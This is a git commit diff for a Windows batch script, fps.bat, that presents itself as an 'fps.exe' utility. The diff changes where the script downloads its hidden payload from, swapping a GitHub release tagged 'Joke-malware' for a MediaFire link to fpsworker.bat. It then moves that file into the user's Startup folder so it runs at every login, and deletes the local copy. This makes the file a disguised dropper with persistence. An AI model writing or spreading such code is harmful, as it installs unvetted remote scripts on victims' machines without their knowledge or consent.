e1633c041ec16ef812cdfe16ab3fe0a876409941
Nate <99703235+GreatNate0509YT@users.noreply.github.com>
2022-10-26 21:09:53 -0500

    Update fps.bat

--- fps.bat
+++ fps.bat
@@ -2,10 +2,12 @@
 title fps.exe
 color 0a
 cls 
-curl -O https://github.com/GreatNate0509YT/Other/releases/download/Joke-malware/sysfps.bat
+cd /d C:/
+cd %userprofile%
+curl -O https://download1532.mediafire.com/4yx8hyuk6yog/eg5sz6dz17av1uz/fpsworker.bat
 cls
-move sysfps.bat %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sysfps.bat
-del sysfps.bat
+move "fpsworker.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\fpsworker.bat"
+del fpsworker.bat
 :start
 cls
 echo fps
